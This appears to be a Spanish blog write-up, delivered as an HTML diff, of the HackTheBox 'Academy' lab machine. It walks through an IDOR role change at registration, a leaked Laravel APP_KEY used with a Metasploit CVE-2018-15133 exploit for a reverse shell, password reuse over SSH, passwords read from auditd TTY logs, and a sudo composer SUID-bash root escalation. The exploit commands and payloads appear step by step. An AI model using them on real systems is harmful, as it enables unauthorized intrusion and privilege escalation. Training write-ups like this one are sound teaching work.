@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Academy — IDOR, Laravel APP_KEY leak (RCE) y escalada por logs de auditoría — Joaquin Silvagni</title>
+    <meta name="description" content="Write-up de HTB Academy: IDOR en el registro para volverse admin, fuga de APP_KEY de Laravel en debug mode (CVE-2018-15133) para RCE, reutilización de credenciales y escalada a root con logs de auditoría TTY y GTFOBins (composer).">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@600;700;800&family=Inter:wght@400;500;600;700&family=JetBrains+Mono:ital,wght@0,400;0,600;1,400&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+    <nav id="nav" class="scrolled">
+        <a class="nav-logo" href="../index.html">Joaquin Silvagni</a>
+        <ul class="nav-links">
+            <li><a href="../index.html#destacados">Destacado</a></li>
+            <li><a href="../index.html#ejpt">Cert</a></li>
+            <li><a href="../index.html#blog">Write-ups</a></li>
+            <li><a href="../index.html#skills">Skills</a></li>
+            <li><a href="../index.html#contacto">Contacto</a></li>
+        </ul>
+    </nav>
+
+    <div class="post-page" style="display:block">
+        <a class="pb" href="../index.html#blog">&larr; Volver al blog</a>
+        <div class="pc2">
+            <div class="ph2">
+                <div class="pm">
+                    <span class="cat-badge" style="background:rgba(163,230,53,.1);color:#a3e635;border:1px solid rgba(163,230,53,.25)">HackTheBox</span>
+                    <span class="pdate">2026-08-06</span>
+                </div>
+                <h1 class="ph1">HTB Academy — IDOR de rol, Laravel APP_KEY leak (RCE) y escalada por logs de auditoría</h1>
+                <p class="psum">Máquina Linux fácil que replica la plataforma de entrenamiento de HackTheBox. La
+                    cadena arranca con un IDOR en el registro para volverse admin, sigue con una fuga de
+                    <strong>APP_KEY</strong> de Laravel en debug mode (CVE-2018-15133 → RCE), reutilización de
+                    credenciales para SSH, y termina en root leyendo contraseñas en los logs de auditoría TTY y
+                    abusando de <code>composer</code> con sudo.</p>
+                <div class="ptr">
+                    <span class="tag">IDOR</span>
+                    <span class="tag">Laravel</span>
+                    <span class="tag">CVE-2018-15133</span>
+                    <span class="tag">PrivEsc</span>
+                    <span class="tag">GTFOBins</span>
+                </div>
+            </div>
+
+            <div class="post-content">
+
+                <p>Academy es una máquina Linux de dificultad fácil que simula la propia plataforma de HackTheBox.
+                    Es una práctica excelente para bug bounty web porque encadena vectores muy reales: un IDOR de
+                    privilegios, un secreto filtrado por una configuración de debug mal puesta, reutilización de
+                    contraseñas y una escalada por un binario que nunca debería correr con sudo.</p>
+
+                <figure>
+                    <img src="../files/img/academy-1.png" alt="Academy — máquina comprometida (pwned) por zSodex">
+                    <figcaption>Academy — user &amp; root. Ambas flags obtenidas.</figcaption>
+                </figure>
+
+                <h2>Cadena de ataque</h2>
+                <ol>
+                    <li><strong>IDOR en registro → cuenta de administrador.</strong> El parámetro <code>roleid</code>
+                        del POST de registro se modifica de <code>0</code> a <code>1</code>.</li>
+                    <li><strong>Laravel debug mode → APP_KEY expuesta.</strong> El panel admin revela un subdominio
+                        de staging cuyo error 500 filtra toda la configuración.</li>
+                    <li><strong>CVE-2018-15133 → shell como www-data.</strong> Deserialización PHP vía
+                        <code>X-XSRF-TOKEN</code> firmando el payload con la APP_KEY.</li>
+                    <li><strong>Credenciales en .env → SSH como cry0l1t3.</strong> El <code>.env</code> de la app
+                        principal tiene una contraseña reutilizada en SSH.</li>
+                    <li><strong>Grupo adm → aureport → contraseña de mrb3n.</strong> Los logs TTY de auditd
+                        registraron la contraseña tecleada en una sesión anterior.</li>
+                    <li><strong>sudo composer → root.</strong> GTFOBins: <code>composer</code> ejecuta scripts
+                        arbitrarios como root.</li>
+                </ol>
+
+                <hr>
+
+                <h2>Paso 1 — Enumeración</h2>
+
+                <h3>Escaneo de puertos con Nmap</h3>
+                <p>Lo primero siempre es saber qué servicios están expuestos. Nmap con detección de versiones
+                    (<code>-sV</code>) y scripts básicos (<code>-sC</code>):</p>
+                <pre><code>$ nmap -sV -sC -oN nmap_academy.txt academy.htb
+
+PORT      STATE SERVICE  VERSION
+22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu
+80/tcp    open  http     nginx 1.18.0 (Ubuntu)
+33060/tcp open  mysqlx   # Puerto alternativo de MySQL, sin acceso externo</code></pre>
+                <p>El 33060 es MySQL X Protocol y sin credenciales no hay nada que hacer ahí. El vector inicial
+                    casi siempre es el servicio HTTP.</p>
+
+                <h3>Enumeración web</h3>
+                <p>El sitio muestra un login y un registro. Mientras se explora a mano, en paralelo corre
+                    <code>dirsearch</code> buscando rutas ocultas:</p>
+                <pre><code>$ dirsearch -u http://academy.htb -e php
+
+[200] /index.php
+[200] /login.php
+[200] /register.php
+[200] /admin.php   # Panel administrativo — normalmente requeriría privilegios</code></pre>
+                <p>Aparece <code>/admin.php</code>, pero con una cuenta normal la app redirige al login. La
+                    pregunta clave es: <em>¿cómo conseguimos acceso de admin?</em></p>
+
+                <hr>
+
+                <h2>Paso 2 — IDOR en el registro: escalada de rol</h2>
+
+                <div class="callout">
+                    <span class="ico">💡</span>
+                    <div><strong>¿Qué es un IDOR?</strong> Insecure Direct Object Reference: la app deja que el
+                        cliente controle una referencia a un objeto sin validar permisos. Acá el "objeto" es el
+                        <strong>rol del usuario</strong>: el servidor debería asignarlo internamente, nunca
+                        aceptarlo del request.</div>
+                </div>
+
+                <p>Al registrar una cuenta y capturar el POST con Burp Suite, el cuerpo revela un parámetro que
+                    no está en el formulario HTML visible:</p>
+                <pre><code>POST /register.php HTTP/1.1
+Host: academy.htb
+Content-Type: application/x-www-form-urlencoded
+
+uid=attacker&password=pass123&confirm=pass123&roleid=0</code></pre>
+                <p>Cambiando <code>roleid=0</code> por <code>roleid=1</code> antes de enviarlo, la cuenta se crea
+                    con privilegios de administrador y <code>/admin.php</code> concede el acceso.</p>
+
+                <div class="callout">
+                    <span class="ico">🎯</span>
+                    <div><strong>Impacto en bug bounty.</strong> Un IDOR de privilegio en el registro es de
+                        severidad alta/crítica: cualquiera se crea una cuenta admin sin control. En la práctica se
+                        buscan campos como <code>role</code>, <code>is_admin</code>, <code>account_type</code>,
+                        <code>plan</code> — parámetros que el formulario no muestra pero el POST sí incluye.</div>
+                </div>
+
+                <p>Dentro del panel, una tarea pendiente filtra un subdominio de desarrollo:</p>
+                <pre><code>Fix issue with dev-staging-01.academy.htb    pending</code></pre>
+                <p>Se agrega al <code>/etc/hosts</code>:</p>
+                <pre><code>$ echo "10.10.10.215  academy.htb dev-staging-01.academy.htb" &gt;&gt; /etc/hosts</code></pre>
+
+                <hr>
+
+                <h2>Paso 3 — Laravel APP_KEY leak → RCE (CVE-2018-15133)</h2>
+
+                <p>Al entrar a <code>http://dev-staging-01.academy.htb</code>, Laravel devuelve un error 500
+                    gigante: la app corre con <code>APP_DEBUG=true</code>, algo que nunca debería estar activo en
+                    algo accesible desde afuera. La página de error (Ignition) expone toda la config, incluida la
+                    <strong>APP_KEY</strong>:</p>
+                <pre><code># Datos críticos expuestos en la página de error:
+
+APP_KEY    = base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
+DB_HOST    = 127.0.0.1
+DB_DATABASE= homestead
+DB_USERNAME= homestead
+DB_PASSWORD= secret</code></pre>
+
+                <div class="callout">
+                    <span class="ico">🔑</span>
+                    <div><strong>¿Para qué sirve la APP_KEY?</strong> Es la clave maestra de cifrado de Laravel:
+                        cifra las cookies de sesión (AES-256-CBC), firma los tokens CSRF y cifra cualquier dato con
+                        <code>encrypt()</code>. En CVE-2018-15133, el header <code>X-XSRF-TOKEN</code> se descifra y
+                        luego se <strong>deserializa en PHP sin validación</strong>: si firmás un payload malicioso
+                        con la APP_KEY, Laravel lo ejecuta al deserializarlo.</div>
+                </div>
+
+                <h3>Explotación con Metasploit</h3>
+                <pre><code>msf&gt; use exploit/unix/http/laravel_token_unserialize_exec
+msf&gt; set RHOSTS academy.htb
+msf&gt; set VHOST dev-staging-01.academy.htb
+msf&gt; set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
+msf&gt; set LHOST 10.10.15.4
+msf&gt; exploit
+
+[*] Command shell session 1 opened
+$ whoami
+www-data</code></pre>
+
+                <div class="callout">
+                    <span class="ico">🛠️</span>
+                    <div><strong>Alternativa sin Metasploit (OSCP-friendly).</strong> Existe el exploit manual
+                        <code>exploit_laravel_cve-2018-15133</code> en GitHub, que usa <code>phpggc</code> para
+                        generar el gadget chain serializado y lo envía directo con Python.</div>
+                </div>
+
+                <hr>
+
+                <h2>Paso 4 — Movimiento lateral: cry0l1t3 (user flag)</h2>
+
+                <p>Como <code>www-data</code> tenemos acceso a los archivos de la app. En Laravel, el
+                    <code>.env</code> guarda toda la config sensible. Se busca en el directorio web:</p>
+                <pre><code>$ find /var/www -name ".env" 2>/dev/null
+/var/www/html/htb-academy-dev-01/.env   # el de staging (ya visto)
+/var/www/html/academy/.env              # el de la app principal
+
+$ cat /var/www/html/academy/.env
+...
+DB_USERNAME=dev
+DB_PASSWORD=mySup3rP4s5w0rd!!      # credencial interesante</code></pre>
+
+                <div class="callout">
+                    <span class="ico">♻️</span>
+                    <div><strong>Password spraying.</strong> Una contraseña de un archivo de config rara vez sirve
+                        solo para la base de datos: la reutilización es de los problemas más comunes en entornos
+                        reales. La probamos contra los usuarios del sistema.</div>
+                </div>
+
+                <p>Entre los usuarios con shell aparece <code>cry0l1t3</code>, que tiene el <code>user.txt</code>.
+                    La contraseña del <code>.env</code> funciona para su SSH:</p>
+                <pre><code>$ ssh cry0l1t3@academy.htb
+Password: mySup3rP4s5w0rd!!
+
+cry0l1t3@academy:~$ cat user.txt
+[ USER FLAG ]</code></pre>
+
+                <hr>
+
+                <h2>Paso 5 — Escalada de privilegios → root</h2>
+
+                <h3>Reconocimiento como cry0l1t3</h3>
+                <pre><code>cry0l1t3@academy:~$ id
+uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)</code></pre>
+
+                <div class="callout">
+                    <span class="ico">📜</span>
+                    <div><strong>El grupo <code>adm</code></strong> en Debian/Ubuntu da lectura a los logs de
+                        <code>/var/log/</code>, incluidos los de auditoría (<code>auditd</code>). En ciertos modos,
+                        auditd registra <strong>todo lo que se teclea en las terminales</strong> (sesiones TTY).</div>
+                </div>
+
+                <h3>Leyendo logs TTY con aureport</h3>
+                <p><code>aureport --tty</code> genera el reporte de las sesiones de terminal — literalmente lo que
+                    los usuarios tipearon:</p>
+                <pre><code>cry0l1t3@academy:~$ aureport --tty
+
+# date time event auid term sess comm data
+1  ...  83  0  ?  1  sh    "bash"
+2  ...  84  0  ?  1  bash  "su mrb3n"
+3  ...  85  0  ?  1  su    "mrb3n_Ac@d3my!"
+4  ...  86  0  ?  1  su    ""</code></pre>
+                <p>Cuando alguien corre <code>su mrb3n</code>, tipea la contraseña en la terminal. En modo TTY,
+                    auditd captura los caracteres reales (los asteriscos son solo visuales — el kernel ya los
+                    registró). Por eso los logs de auditoría deben estar bien protegidos.</p>
+
+                <h3>Acceso como mrb3n y análisis de sudo</h3>
+                <pre><code>cry0l1t3@academy:~$ su mrb3n
+Password: mrb3n_Ac@d3my!
+
+mrb3n@academy:~$ sudo -l
+User mrb3n may run the following commands on academy:
+    (root) /usr/bin/python3 /usr/bin/composer</code></pre>
+
+                <div class="callout">
+                    <span class="ico">📦</span>
+                    <div><strong>composer + sudo = peligro.</strong> <code>composer</code> (gestor de dependencias
+                        de PHP) tiene un sistema de <em>scripts</em> definidos en <code>composer.json</code> que se
+                        ejecutan como procesos del SO. Si lo corrés como root y controlás el <code>composer.json</code>,
+                        root ejecuta lo que quieras. Está documentado en GTFOBins.</div>
+                </div>
+
+                <h3>GTFOBins: composer → root shell</h3>
+                <p>Creamos un <code>composer.json</code> con un script que le da SUID a una copia de
+                    <code>/bin/bash</code>, y lo ejecutamos con sudo:</p>
+                <pre><code>mrb3n@academy:~$ echo '{"scripts":{"x":"cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash"}}' &gt; composer.json
+
+mrb3n@academy:~$ sudo composer run-script x
+&gt; cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash
+
+mrb3n@academy:~$ ls -la /tmp/bash
+-rwsr-sr-x 1 root root 1183448 /tmp/bash</code></pre>
+                <p>El bit SUID hace que el binario corra con los privilegios del <strong>propietario</strong>
+                    (root). Con <code>-p</code>, bash no descarta el UID efectivo elevado:</p>
+                <pre><code>mrb3n@academy:~$ /tmp/bash -p
+
+bash-5.0# id
+uid=1001(mrb3n) gid=1001(mrb3n) euid=0(root) egid=0(root)
+
+bash-5.0# cat /root/root.txt
+[ ROOT FLAG ]</code></pre>
+
+                <hr>
+
+                <h2>Lecciones para bug bounty y pentesting</h2>
+                <ul>
+                    <li><strong>Interceptá siempre los formularios de registro.</strong> El HTML muestra solo los
+                        campos visibles, pero el POST puede llevar parámetros ocultos (<code>role</code>,
+                        <code>is_admin</code>, <code>account_type</code>, <code>plan</code>, <code>subscription</code>).</li>
+                    <li><strong>Laravel en debug mode es crítico.</strong> <code>APP_DEBUG=true</code> accesible
+                        desde internet expone rutas, versiones, config completa y —en versiones viejas— la APP_KEY.
+                        Provocar un error y ver si aparece Ignition es un check rutinario.</li>
+                    <li><strong>Los <code>.env</code> son minas de oro.</strong> Buscar <code>.env</code>,
+                        <code>config.php</code>, <code>web.config</code>, <code>database.yml</code> debe ser
+                        automático: credenciales, API keys, claves de cifrado — y casi siempre reutilizadas.</li>
+                    <li><strong>El grupo <code>adm</code> revela info sensible.</strong> Con auditoría activa,
+                        <code>aureport --tty</code> puede escupir contraseñas tecleadas en sesiones anteriores.</li>
+                    <li><strong>GTFOBins es referencia obligada.</strong> Documenta cómo binarios legítimos
+                        escalan privilegios con sudo/SUID. Revisá el arsenal disponible contra GTFOBins en cada
+                        pentest.</li>
+                </ul>
+
+            </div>
+        </div>
+    </div>
+
+    <footer><span>&copy; 2026 <span class="fa">Joaquin Silvagni</span></span><span>Offensive Security · Tooling</span></footer>
+</body>
+</html>
